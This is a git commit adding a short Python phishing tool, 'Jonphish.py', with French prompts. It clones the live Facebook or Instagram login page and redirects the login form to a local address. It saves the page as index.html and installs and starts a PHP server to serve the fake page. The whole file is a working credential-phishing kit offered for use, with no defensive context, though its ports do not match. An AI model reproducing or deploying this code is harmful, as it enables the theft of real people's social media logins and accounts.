ecc5b0512e1785d4b57a9444470396141b92c527
Jhonsonwannaa <114837630+Jhonsonwannaa@users.noreply.github.com>
2023-09-09 10:55:43 +0100

    Create Jonphish.py

---
+++ Jonphish.py
@@ -0,0 +1,33 @@
+import requests
+from bs4 import BeautifulSoup
+import urllib3
+import os 
+from rich.console import Console
+
+console = Console()
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+#author : Jhonson
+
+site=['https://m.facebook.com/login/?locale=fr_FR','https://www.instagram.com/accounts/login/']
+decor = '[bold yellow]'
+console.print(f'\n\n{decor}'+'[0]'+str('FACEBOOK')+'\n[1]INSTAGRAM\n\n')
+
+try :
+	
+		url=int(console.input('[bold blue]Veuillez entrer ou saisir un chiffre correspondant a votre site phishing que vous voulez voir :'))
+		r =requests.get(f'{site[url]}', verify=False)
+		soup = BeautifulSoup(r.text, 'html.parser')
+		modif = soup.select_one('form[action]')
+		if modif :
+		  modif['action']='http://0.0.0.0:8000'
+		  change = str(soup.prettify())
+		  file =open('index.html','w')
+		  file.write(change)
+		  def php_server():
+		  	os.system('apt install php')
+		  	os.system('php -S 0.0.0.0:3000')
+		  php_server()	
+except :
+	console.print ('[bold red] Entre uniquement un chiffre !')
